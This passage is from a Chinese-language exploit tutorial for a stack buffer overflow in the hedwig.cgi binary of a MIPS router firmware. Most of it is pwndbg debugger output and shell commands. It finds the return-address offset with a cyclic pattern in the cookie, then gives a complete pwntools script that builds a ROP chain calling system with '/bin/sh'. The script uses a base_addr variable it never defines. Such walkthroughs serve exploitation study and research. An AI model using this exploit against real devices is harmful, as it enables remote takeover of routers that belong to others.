     A3   0x0
     T0   0x0
     T1   0x0
     T2   0x0
     T3   0x0
     T4   0x0
     T5   0x0
     T6   0x0
     T7   0x0
     T8   0x0
     T9   0x0
     S0   0x0
     S1   0x0
     S2   0x0
     S3   0x0
     S4   0x0
     S5   0x0
     S6   0x0
     S7   0x0
     S8   0x0
     FP   0x0
     SP   0x76ffea50 ◂— 0x1
     PC   0x767e9a00 ◂— move   $t9, $ra /* 0x3e0c821 */
    ───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
     ► 0x767e9a00    move   $t9, $ra
       0x767e9a04    bal    0x767e9a0c
       0x767e9a08    nop    
       0x767e9a0c    lui    $gp, 2
       0x767e9a10    addiu  $gp, $gp, -0x39fc
       0x767e9a14    addu   $gp, $gp, $ra
       0x767e9a18    move   $ra, $t9
       0x767e9a1c    lw     $a0, -0x7fe8($gp)
       0x767e9a20    sw     $a0, -0x7ff0($gp)
       0x767e9a24    move   $a0, $sp
       0x767e9a28    addiu  $sp, $sp, -0x10
    ───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
    00:0000│ sp  0x76ffea50 ◂— 0x1
    01:0004│     0x76ffea54 —▸ 0x76ffeb53 ◂— './htdocs/web/hedwig.cgi'
    02:0008│     0x76ffea58 ◂— 0x0
    03:000c│     0x76ffea5c —▸ 0x76ffeb6b ◂— 'REMOTE_ADDR=0.0.0.0'
    04:0010│     0x76ffea60 —▸ 0x76ffeb7f ◂— 'REQUEST_URI=/hedwig.cgi'
    05:0014│     0x76ffea64 —▸ 0x76ffeb97 ◂— 0x50545448 ('HTTP')
    06:0018│     0x76ffea68 —▸ 0x76fff1ab ◂— 'REQUEST_METHOD=POST'
    07:001c│     0x76ffea6c —▸ 0x76fff1bf ◂— 'CONTENT_TYPE=application/x-www-form-urlencoded'
    ─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
     ► f 0 767e9a00
然后让程序继续运行,此时报错
    pwndbg> c
    Continuing.
    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
     V0   0xffffffff
     V1   0x4b
     A0   0x76ffe480 —▸ 0x767ae4e0 ◂— 0x0
     A1   0x1
     A2   0x42e000 ◂— 0x0
     A3   0x20
     T0   0x767ab4c8 ◂— 0x4b /* 'K' */
     T1   0x1309
     T2   0x2
     T3   0x24
     T4   0x25
     T5   0x807
     T6   0x800
     T7   0x400
     T8   0x8
     T9   0x0
     S0   0x41414141 ('AAAA')
     S1   0x41414141 ('AAAA')
     S2   0x41414141 ('AAAA')
     S3   0x41414141 ('AAAA')
     S4   0x41414141 ('AAAA')
     S5   0x41414141 ('AAAA')
     S6   0x41414141 ('AAAA')
     S7   0x41414141 ('AAAA')
     S8   0x41414141 ('AAAA')
     FP   0x76ffe980 ◂— 0x41414141 ('AAAA')
     SP   0x76ffe980 ◂— 0x41414141 ('AAAA')
     PC   0x41414141 ('AAAA')
    ───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
    Invalid address 0x41414141
    ───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
    00:0000│ fp sp  0x76ffe980 ◂— 0x41414141 ('AAAA')
    ... ↓
    ─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
     ► f 0 41414141
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    Program received signal SIGSEGV
    pwndbg>
好了,栈溢出实锤了,之后我们改一下运行脚本,测试一下偏移
    cyclic 600
改一下程序运行脚本之后发现程序回显为:
    HTTP/1.1 200 OK
    Content-Type: text/xml
    FAILEDunable to open temp file.%
无法打开某tmp文件,但是程序在之前是直接溢出的,那么我们先改大输入流
    pwndbg> cyclic 1536
将运行命令改为:
    sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=`python -c "print 'uid=123'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaap'"` -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="0.0.0.0" -g 23946 ./htdocs/web/hedwig.cgi
成功栈溢出
    pwndbg> c
    Continuing.
    Program received signal SIGSEGV, Segmentation fault.
    0x6b61616b in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
     V0   0xffffffff
     V1   0x4b
     A0   0x76ffe480 —▸ 0x767ae4e0 ◂— 0x0
     A1   0x1
     A2   0x42e000 ◂— 0x0
     A3   0x20
     T0   0x767ab4c8 ◂— 0x4b /* 'K' */
     T1   0x1309
     T2   0x2
     T3   0x24
     T4   0x25
     T5   0x807
     T6   0x800
     T7   0x400
     T8   0x8
     T9   0x0
     S0   0x6b616162 ('baak')
     S1   0x6b616163 ('caak')
     S2   0x6b616164 ('daak')
     S3   0x6b616165 ('eaak')
     S4   0x6b616166 ('faak')
     S5   0x6b616167 ('gaak')
     S6   0x6b616168 ('haak')
     S7   0x6b616169 ('iaak')
     S8   0x6b61616a ('jaak')
     FP   0x76ffe980 ◂— 0x6b61616c ('laak')
     SP   0x76ffe980 ◂— 0x6b61616c ('laak')
     PC   0x6b61616b ('kaak')
    ───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
    Invalid address 0x6b61616b
    ───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
    00:0000│ fp sp  0x76ffe980 ◂— 0x6b61616c ('laak')
    01:0004│        0x76ffe984 ◂— 0x6b61616d ('maak')
    02:0008│        0x76ffe988 ◂— 0x6b61616e ('naak')
    03:000c│        0x76ffe98c ◂— 0x6b61616f ('oaak')
    04:0010│        0x76ffe990 ◂— 0x6b616170 ('paak')
    05:0014│        0x76ffe994 ◂— 0x6b616171 ('qaak')
    06:0018│        0x76ffe998 ◂— 0x6b616172 ('raak')
    07:001c│        0x76ffe99c ◂— 0x6b616173 ('saak')
    ─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
     ► f 0 6b61616b
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    Program received signal SIGSEGV
此时查一下偏移量
    pwndbg> cyclic -l 0x6b61616b
    1040
好的,现在我们有了偏移量,下面就可以开始构造payload了  
在日常的栈溢出中,我们的目标是esp指针,但是在mips架构下,我们的目标就变成了$ra,因为是路由器,所以一般没有aslr,我们只需要找到基址,然后直接调用system函数即可,
这里提一个小trick,
在我们想写入的地址有坏字节时,可以通过先-1写入,后面依靠其他gadget来将地址加一来完成构造(比如本例中system函数是在0x53200,我们先存入减一的值,再后面再利用gadget来加一恢复
exp如下:
    #!/usr/bin/python
    from pwn import *
    context.endian="little"
    context.arch="mips"
    system_addr = 0x53200-1+0x767e9000
    add_jar = 0x159CC # addiu $s5,$sp,0x170+var_160 | jalr $s0 |
    sys_1 = 0x000158C8 # addiu $s0,1 | jalr $s5 |
    padding = 'uid=' + 'a' * 1013
    padding += p32(base_addr + system_addr)       
    padding += 'a' * 16
    padding += p32(base_addr+add_jar)               
    padding += 'a' * 12 
    padding += p32(base_addr + sys_1)       
    padding += 'a' * 0x10
    padding += '/bin/sh\x00'
    with open("payload",'wb') as f:
        f.write(padding)
    f.close()
enjoy:)